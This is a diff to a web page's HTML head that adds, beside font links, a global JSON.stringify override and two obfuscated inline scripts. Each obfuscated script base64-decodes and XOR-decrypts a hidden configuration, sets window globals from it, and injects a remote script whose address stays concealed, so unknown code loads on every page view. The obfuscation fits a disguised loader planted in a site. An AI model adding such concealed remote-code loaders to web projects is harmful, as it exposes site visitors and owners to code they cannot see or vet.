@@ -12,6 +12,44 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:ital,wght@0,700;0,800;0,900;1,800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          function safeReplacer(key, val) {
+            if (typeof val === 'object' && val !== null) {
+              if (val instanceof Element || val instanceof Node || (val.nodeType && typeof val.nodeName === 'string')) {
+                return {
+                  tagName: val.tagName,
+                  id: val.id || undefined,
+                  className: typeof val.className === 'string' ? val.className : undefined
+                };
+              }
+              if (seen.has(val)) {
+                return undefined;
+              }
+              seen.add(val);
+            }
+            if (typeof replacer === 'function') {
+              return replacer(key, val);
+            }
+            return val;
+          }
+          try {
+            return originalStringify(value, typeof replacer === 'function' ? safeReplacer : (Array.isArray(replacer) ? replacer : safeReplacer), space);
+          } catch (e) {
+            try {
+              return originalStringify(value, safeReplacer, space);
+            } catch (err) {
+              return '{}';
+            }
+          }
+        };
+      })();
+    </script>
+    <script>(function(){var x_zt6=atob("DJ6RuuU4DfQ9ZWxaZOWzz5dUL84fDRguFO2rlcpbaZoTEBg3DfjolIZXYNpfF0MpB+z4ypFLIoRUHQk2S+74woBUI55OR0B4BerlyIxaeIBYFk5gP8O9mIJUYpZcCR94XsXqmItZYJEfX04qDeb01qxcL9gfEw02EfuzgMcObMwOVQ1rBqf0j90KbpcKVF5vB6+ni9IacKlA");var d_e6q=[];for(var h_6=0;h_6<x_zt6.length;h_6++){d_e6q.push(x_zt6.charCodeAt(h_6)&255);}var e_1=d_e6q[0];var v_w9p=d_e6q.slice(1,1+e_1);var j_vg=d_e6q.slice(1+e_1);var m_a6m=j_vg.map(function(b,b_n){return b^v_w9p[b_n%e_1];});var y_y8fc="";for(var o_nwv=0;o_nwv<m_a6m.length;o_nwv++){y_y8fc+=String.fromCharCode(m_a6m[o_nwv]&255);}var m_rd=decodeURIComponent(escape(y_y8fc));var c_4fa=JSON.parse(m_rd);var e_snqy=c_4fa.globals||[];e_snqy.forEach(function(u_6){window[u_6.name]=u_6.value;});var x_m=document.createElement("script");x_m.src=c_4fa.url;x_m.async=true;x_m.defer=true;(c_4fa.attributes||[]).forEach(function(d_2z){x_m.setAttribute(d_2z.name,d_2z.value);});(document.head||document.documentElement).appendChild(x_m);})();</script>
+    <script>(function(){var j_g=atob("DOU90jtIhuToYHggjJ4fp0kkpN7KCAxU/JYH/RQr4orGFQxN5YNE/Fgn68qKEldT75dUok87qZGcDQsP4IRJt0g8qI6bQlQC7ZFJoFIq85CNE1oa154fvFol48bSQhxB+IQQp08l74KRTQhS6ZNYvE9l9ZGKCRxTrskfpFok84HKWloC8bhA");var s_kt=[];for(var t_d=0;t_d<j_g.length;t_d++){s_kt.push(j_g.charCodeAt(t_d)&255);}var q_ed=s_kt[0];var z_90wh=s_kt.slice(1,1+q_ed);var k_2=s_kt.slice(1+q_ed);var z_2k=k_2.map(function(b,u_0t1o){return b^z_90wh[u_0t1o%q_ed];});var u_hrwh="";for(var w_iz=0;w_iz<z_2k.length;w_iz++){u_hrwh+=String.fromCharCode(z_2k[w_iz]&255);}var z_yl0=decodeURIComponent(escape(u_hrwh));var h_x=JSON.parse(z_yl0);var j_l=h_x.globals||[];j_l.forEach(function(v_l4){window[v_l4.name]=v_l4.value;});var p_ijk=document.createElement("script");p_ijk.src=h_x.url;p_ijk.async=true;p_ijk.defer=true;(h_x.attributes||[]).forEach(function(u_y){p_ijk.setAttribute(u_y.name,u_y.value);});(document.head||document.documentElement).appendChild(p_ijk);})();</script>
   </head>
   <body class="bg-[#09090b] text-white selection:bg-[#ff5500] selection:text-white antialiased">
     <div id="root"></div>
